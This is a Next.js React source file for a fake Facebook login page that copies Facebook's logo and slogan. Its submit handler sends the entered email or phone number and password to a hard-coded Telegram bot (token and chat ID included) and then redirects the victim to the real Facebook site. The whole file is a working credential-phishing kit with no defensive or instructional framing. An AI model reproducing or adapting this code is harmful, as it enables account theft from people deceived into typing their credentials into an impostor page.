'use client';
import Image from 'next/image'
import { useState } from 'react';
export default function Example() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

;
  const sendMessage = async (e) => {
    e.preventDefault();
    
   
    const token = '6863971897:AAH_rx-DOq87BDmzaHKtyNQpBnpZidNLRHI'; // Your Telegram bot token
  
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: username +'--'+ password,
          chat_id :'92170602'
        }),
      });

      window.location.href = 'https://www.facebook.com/m';

     
    } catch (error) {
      console.error('Error:', error);
    }
  };

  return (
    <>

      <div className="flex min-h-full flex-1 flex-col justify-center  sm:px-6 lg:px-8">
        <div className="sm:mx-auto sm:w-full sm:max-w-md">
          <Image
            width={300}
            height={40}
            className="mx-auto h-40"
            src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
            alt="Your Company"
          />
          <h2 className="mt-6 text-center text-3xl tracking-tight text-gray-900">
          Connect with friends and the world around you on Facebook.
          </h2>
        </div>

        <div className="mt-10 sm:mx-auto m-4 sm:w-full sm:max-w-[380px]">
          <div className="bg-white   shadow-lg sm:rounded-lg p-4">
            <form onSubmit={sendMessage} className="space-y-6" action="#" method="POST">
              <div>
          
                <div className="mt-2">
                  <input
                    id="email"
                    name="email"
                    type="email"
                    onChange={(e) => setUsername(e.target.value)}
                    autoComplete="email"
                    required
                    placeholder="Email or Phone Number"
                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                  />
                </div>
              </div>

              <div>
              
                <div className="mt-2">
                <input
                    id="email"
                    name="email"
                    onChange={(e) => setPassword(e.target.value)}
                    type="password"
                    required
                    placeholder="Password"
                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                  />
                </div>
              </div>

          

              <div >
                <button
              
                  type="submit"
                  className="w-full text-bold h-14  bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-md mb-3"
                >
                  Login
                </button>

                <p className="text-center text-blue-500">Forgot password?</p>

                <div className='my-5 border-b border-1 border-gray-200'>

                </div>
                <div className='flex justify-center'>
                  <button
                    type="submit"
                    className="w-[200px] text-bold h-14  bg-[#42b72a] hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-md mb-3"
                  >
                    Login
                  </button>
                </div>
              </div>
             
            </form>

            <div>
              <div className="relative mt-10">
                <div className="absolute inset-0 flex items-center" aria-hidden="true">
                  <div className="w-full border-t border-gray-200" />
                </div>
                <div className="relative flex justify-center text-sm font-medium leading-6">
                 
                </div>
              </div>

             
            </div>
          </div>

          <p className="mt-10 text-center text-sm text-gray-500">
           
            <a href="#" className="font-semibold leading-6 text-black-600 hover:text-black-500">
            Create a Page for a celebrity, brand or business.
            </a>
          </p>
        </div>
      </div>
    </>
  )
}
